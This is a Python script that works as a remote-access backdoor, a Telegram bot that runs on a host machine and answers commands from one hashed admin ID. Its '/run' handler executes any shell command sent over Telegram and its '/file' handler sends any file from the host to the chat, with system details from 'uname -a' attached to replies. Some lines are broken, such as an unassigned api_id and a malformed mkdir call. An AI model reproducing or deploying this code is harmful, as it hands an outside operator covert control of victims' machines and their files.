
import os
import sys
import random
from telethon import TelegramClient, events
import hashlib


# GRD

#_______________________________________________________________________________
try:
    os.mkdir("mkdir ~/.data/")
except:
    os.popen("echo \"systest\" > /dev/null ")
try:
    r = os.popen("whoami").read()
    r = r.replace("\n",'')

    os.chdir("/home/" + r + "/.data")
except:
    print("")
#_______________________________________________________________________________


# OB

#_______________________________________________________________________________

def sha256c(data):
    encoded = data.encode()
    m = hashlib.sha256(encoded)
    return m.hexdigest()

def rand_gen():
    row = 0
    dat = 1
    while row < 12:
        delix = random.randrange(2, 1000)
        delix2 = random.randrange(2, 1000)
        dat += delix*delix2
        row += 1
    return dat
#_______________________________________________________________________________


# IS

#_______________________________________________________________________________
try:
    infol = "`" + os.popen("uname -a ; echo \n").read() + "`"
except:
    print('')
#_______________________________________________________________________________


# TCS | D

#_______________________________________________________________________________

api_id = #id
api_hash = '' #haah
bot_token = "" #bot token
admin = "" #admin is

bot = TelegramClient("King", api_id, api_hash).start(bot_token=bot_token)

bot.start()

@bot.on(events.NewMessage(pattern=r'/start'))
async def handler(event):
    if sha256c(str(event.message.to_id.user_id)) == admin:
        await event.reply(infol + "you are welcome :D")

@bot.on(events.NewMessage(pattern=r'/status'))
async def handler(event):
    if sha256c(str(event.message.to_id.user_id)) == admin:
        r = os.popen("uptime")
        await event.reply(infol + r.read())

@bot.on(events.NewMessage(pattern=r'/file'))
async def handler(event):
    if sha256c(str(event.message.to_id.user_id)) == admin:
        e = event.raw_text[6:]
        await bot.send_file(event.chat_id , e)
@bot.on(events.NewMessage(pattern=r'/run'))
async def handler(event):
    if sha256c(str(event.message.to_id.user_id)) == admin:
        e = event.raw_text[5:]
        print(e)
        r = os.popen(e)
        await event.reply(infol +r.read())

bot.run_until_disconnected()

#_______________________________________________________________________________
